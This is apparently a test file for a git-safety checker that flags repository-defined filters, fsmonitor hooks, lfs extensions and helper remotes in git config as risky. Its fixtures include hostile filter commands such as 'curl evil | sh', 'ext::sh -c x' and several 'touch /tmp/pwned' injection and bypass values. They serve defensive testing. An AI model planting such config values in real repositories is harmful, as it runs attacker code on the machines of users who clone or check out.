import { test } from "node:test";
import assert from "node:assert/strict";
import { gitConfigVerdict, GIT_RISKY_KEYS, actionRisks, ACTION_KEYS } from "../mods/vsc/lib/git-safety.js";

// Real output shape of: git config -z --includes --show-scope --get-regexp GIT_RISKY_KEYS
const rec = (scope, key, value) => `${scope}\0${key}\n${value}\0`;
const LFS = rec("local", "filter.lfs.clean", "git-lfs clean -- %f") + rec("local", "filter.lfs.smudge", "git-lfs smudge -- %f")
  + rec("local", "filter.lfs.process", "git-lfs filter-process");

test("no matching keys (exit 1) means git may run", () => {
  assert.equal(gitConfigVerdict(1, ""), "safe");
});

test("a filter program defined by the repository blocks git", () => {
  assert.equal(gitConfigVerdict(0, rec("local", "filter.evil.clean", "echo PWNED > /tmp/x; cat")), "repo-filter");
  assert.equal(gitConfigVerdict(0, rec("worktree", "filter.x.smudge", "sh -c id")), "repo-filter");
  assert.equal(gitConfigVerdict(0, rec("local", "core.fsmonitor", "./hook.sh")), "repo-filter");
});

test("exactly the standard git-lfs commands are allowed, and the user's own global or system filters", () => {
  assert.equal(gitConfigVerdict(0, LFS), "safe");
  assert.equal(gitConfigVerdict(0, rec("local", "filter.lfs.smudge", "git-lfs smudge --skip -- %f") + rec("local", "filter.lfs.process", "git-lfs filter-process --skip")), "safe");
  assert.equal(gitConfigVerdict(0, rec("global", "filter.mine.clean", "my-tool") + rec("system", "filter.x.clean", "anything")), "safe");
  assert.equal(gitConfigVerdict(0, rec("local", "core.fsmonitor", "false")), "safe", "turning fsmonitor off is fine");
});

test("bypass: a filter name containing spaces and git-lfs is still a repository filter", () => {
  assert.equal(gitConfigVerdict(0, rec("local", "filter.x git-lfs y.clean", "touch /tmp/pwned")), "repo-filter");
});

test("bypass: a git-lfs command with anything after it is blocked", () => {
  assert.equal(gitConfigVerdict(0, rec("local", "filter.lfs.clean", "git-lfs clean -- %f; touch /tmp/pwned")), "repo-filter");
  assert.equal(gitConfigVerdict(0, rec("local", "filter.lfs.clean", "curl evil | sh")), "repo-filter");
  assert.equal(gitConfigVerdict(0, rec("local", "filter.other.clean", "git-lfs clean -- %f")), "repo-filter", "lfs commands only under filter.lfs");
});

test("any other exit code or malformed output fails closed", () => {
  assert.equal(gitConfigVerdict(128, ""), "unknown");
  assert.equal(gitConfigVerdict(0, "local\tfilter.x.clean cmd\n"), "unknown", "not the -z format");
  assert.equal(gitConfigVerdict(0, "local\0no-newline-here\0"), "unknown");
});

test("the key pattern covers filters and fsmonitor", () => {
  const re = new RegExp(GIT_RISKY_KEYS);
  for (const k of ["filter.x.clean", "filter.a.b.smudge", "filter.x.process", "core.fsmonitor"]) assert.ok(re.test(k), k);
  assert.ok(!re.test("filter.x.required") && !re.test("core.editor"));
});

test("git-lfs extensions defined by the repository are blocked (git-lfs runs them on clean)", () => {
  const lfsStd = rec("local", "filter.lfs.clean", "git-lfs clean -- %f");
  assert.equal(gitConfigVerdict(0, lfsStd + rec("local", "lfs.extension.evil.clean", "touch /tmp/pwned")), "repo-filter");
  assert.equal(gitConfigVerdict(0, rec("worktree", "lfs.extension.x.smudge", "anything")), "repo-filter");
  assert.equal(gitConfigVerdict(0, rec("global", "lfs.extension.mine.clean", "my-tool")), "safe");
  assert.ok(new RegExp(GIT_RISKY_KEYS).test("lfs.extension.evil.clean"));
});

test("actionRisks: a remote's vcs helper, and a branch whose remote is a helper address, are listed", () => {
  const z = (...pairs) => pairs.map(([k, v]) => `local\0${k}\n${v}`).join("\0") + "\0";
  const keys = new RegExp(ACTION_KEYS);
  for (const k of ["remote.origin.vcs", "branch.main.remote", "branch.main.pushremote"]) assert.ok(keys.test(k), k);
  assert.deepEqual(actionRisks(0, z(["remote.origin.vcs", "mine"]), []), ["remote.origin.vcs = mine"]);
  assert.deepEqual(actionRisks(0, z(["branch.main.remote", "foo::bar"], ["branch.dev.pushremote", "ext::sh -c x"]), []),
    ["branch.main.remote = foo::bar", "branch.dev.pushremote = ext::sh -c x"]);
  // A branch following a plain remote name is expected.
  assert.deepEqual(actionRisks(0, z(["branch.main.remote", "origin"], ["branch.main.pushremote", "fork"]), []), []);
});
